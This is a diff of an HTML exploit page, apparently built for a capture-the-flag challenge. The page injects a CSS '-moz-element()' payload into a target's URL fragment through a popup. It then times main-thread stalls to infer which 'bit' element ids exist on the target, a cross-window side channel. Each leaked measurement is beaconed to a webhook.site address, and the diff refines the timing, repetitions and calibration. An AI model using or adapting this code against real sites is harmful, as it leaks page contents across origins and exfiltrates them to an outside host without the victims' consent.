@@ -1,59 +1,71 @@
 <!doctype html><html><head><meta charset="utf-8"><title>r</title></head><body><script>
 (function(){
-var WH = "https://webhook.site/19df9959-1780-4948-a6c1-a6e5d7df5d90";
-var TARGET = "http://localhost:3000/";
-function q(k,d){var s=location.search+"&"+location.hash.replace(/^#/,"");var m=new RegExp("[?&#]"+k+"=([^&]*)").exec(s);return m?decodeURIComponent(m[1]):d;}
-var start = parseInt(q("start","0"),10);
-var ns    = parseInt(q("ns","12"),10);
-var pm    = parseInt(q("pm","300"),10);
-var bx    = parseInt(q("bx","1500"),10);
-var ly    = parseInt(q("ly","6"),10);
-var tsz   = q("ts","7,53,131,307,21,89");
-var tiles = tsz.split(",").map(Number);
-var sid   = q("sid", Math.random().toString(36).slice(2,7));
+function q(k,d){var s=location.search+"&"+location.hash.replace(/^#/,"");var m=new RegExp("[?&#]"+k+"=([^&]*)").exec(s);return m?decodeURIComponent(m[1].replace(/\+/g," ")):d;}
+var WH     = q("wh","https://webhook.site/19df9959-1780-4948-a6c1-a6e5d7df5d90");
+var TARGET = q("target","http://localhost:3000/");
+var start  = parseInt(q("start","0"),10);
+var ns     = parseInt(q("ns","16"),10);
+var pm     = parseInt(q("pm","450"),10);
+var bx     = parseInt(q("bx","3000"),10);
+var ly     = parseInt(q("ly","6"),10);
+var tsz    = q("ts","2,3,5,400,7,900");
+var fb     = parseInt(q("fb","0"),10);
+var reps   = parseInt(q("reps","2"),10);
+var rz     = parseInt(q("rz","1"),10);
+var sid    = q("sid", Math.random().toString(36).slice(2,7));
+var tiles  = tsz.split(",").map(Number);
 
-function beacon(tag,data){ try{ var i=new Image(); i.src = WH + "?sid="+sid+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(String(data))+"&t="+Date.now(); }catch(e){} }
+function beacon(tag,data){ try{ var i=new Image(); i.src = WH + (WH.indexOf("?")<0?"?":"&") + "sid="+sid+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(String(data))+"&t="+Date.now(); }catch(e){} }
 function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
 
 function payload(id){
   var L=[]; for(var i=0;i<ly;i++){ var t=tiles[i%tiles.length]; L.push("-moz-element(#"+id+") "+i+"px "+i+"px/"+t+"px "+(t+1)+"px"); }
-  return '<p style="position:fixed;top:0;left:0;width:'+bx+'px;height:'+bx+'px;background:'+L.join(",")+'">x</p>';
+  var f = fb>0 ? ";filter:blur("+fb+"px)" : "";
+  return '<p style="position:fixed;top:0;left:0;width:'+bx+'px;height:'+bx+'px;background:'+L.join(",")+f+'">x</p>';
 }
 
-var maxGap=0,lastT=0;
+var maxGap=0,lastT=0,rafMax=0,rl=0;
 function tick(){ var n=performance.now(); var g=n-lastT; if(g>maxGap)maxGap=g; lastT=n; setTimeout(tick,0); }
+function raf(){ var n=performance.now(); var g=n-rl; if(g>rafMax)rafMax=g; rl=n; requestAnimationFrame(raf); }
 
 var win=null, counter=0;
 async function measure(id){
-  counter++;
-  maxGap=0; lastT=performance.now();
-  var worstBusy=0, sink=0;
-  try{ win.location = TARGET+"?n="+counter+"#"+encodeURIComponent(payload(id)); }catch(e){ beacon("err","loc "+e); }
-  var end=performance.now()+pm;
-  while(performance.now()<end){
-    var b0=performance.now(); for(var i=0;i<200000;i++){ sink+=i*1.0001; } var dt=performance.now()-b0;
-    if(dt>worstBusy)worstBusy=dt;
-    await sleep(0);
+  var bg=0,br=0,bb=0;
+  for(var rep=0;rep<reps;rep++){
+    counter++;
+    maxGap=0; lastT=performance.now(); rafMax=0; rl=performance.now();
+    try{ win.location = TARGET+"?n="+counter+"#"+encodeURIComponent(payload(id)); }catch(e){ beacon("err","loc "+e); }
+    var worstBusy=0, sink=0;
+    var end=performance.now()+pm;
+    while(performance.now()<end){
+      var b0=performance.now(); for(var i=0;i<120000;i++){ sink+=i*1.0001; } var dt=performance.now()-b0;
+      if(dt>worstBusy)worstBusy=dt;
+      await sleep(5);
+    }
+    await sleep(60); // settle: let tick() record a stall that ended near/after the window
+    if(maxGap>bg)bg=maxGap; if(rafMax>br)br=rafMax; if(worstBusy>bb)bb=worstBusy;
+    if(bg>180) break; // already clearly present, stop early
   }
-  return {id:id, gap:Math.round(maxGap), busy:Math.round(worstBusy*10)/10, s:sink};
+  return {id:id, g:Math.round(bg), r:Math.round(br), b:Math.round(bb*10)/10};
 }
 
 (async function(){
-  beacon("ALIVE","ua="+navigator.userAgent.slice(0,32)+";bx="+bx+";ly="+ly+";ts="+tsz+";pm="+pm+";start="+start+";ns="+ns);
-  try{ win=window.open(TARGET+"?init=1#hi","imp","width=1000,height=800"); }catch(e){ beacon("err","open "+e); }
+  beacon("ALIVE","ua="+navigator.userAgent.slice(0,24)+";hc="+navigator.hardwareConcurrency+";bx="+bx+";ly="+ly+";fb="+fb+";pm="+pm+";reps="+reps+";rz="+rz+";ts="+tsz+";start="+start+";ns="+ns);
+  try{ win=window.open(TARGET+"?init=1#hi","imp","width=900,height=700"); }catch(e){ beacon("err","open "+e); }
   if(!win){ beacon("err","popup-null"); try{window.__IMPRESSION_DONE__=true;}catch(e){} return; }
-  setTimeout(tick,0);
+  setTimeout(tick,0); requestAnimationFrame(raf);
   await sleep(900);
+  await measure("bit-997-0"); await measure("bit-996-0"); // warmup (discard)
   var cA=await measure("bit-999-0");
   var cB=await measure("bit-654-3");
-  beacon("cal","A="+cA.gap+"/"+cA.busy+";B="+cB.gap+"/"+cB.busy);
+  beacon("cal","A="+cA.g+"/"+cA.r+"/"+cA.b+";B="+cB.g+"/"+cB.r+"/"+cB.b);
   for(var s=start;s<start+ns;s++){
     var row=[];
-    for(var b=0;b<4;b++){ var r=await measure("bit-"+s+"-"+b); row.push(r.gap+"/"+r.busy); }
-    beacon("s"+s, row.join(","));
+    for(var b=0;b<4;b++){ var r=await measure("bit-"+s+"-"+b); row.push(r.g+"/"+r.r+"/"+r.b); }
+    beacon("s"+s, row.join(" , "));
   }
   var cC=await measure("bit-321-0");
-  beacon("done","C="+cC.gap+"/"+cC.busy+";n="+counter);
+  beacon("done","C="+cC.g+"/"+cC.r+"/"+cC.b+";n="+counter);
   try{ window.__IMPRESSION_DONE__=true; }catch(e){}
 })();
 })();
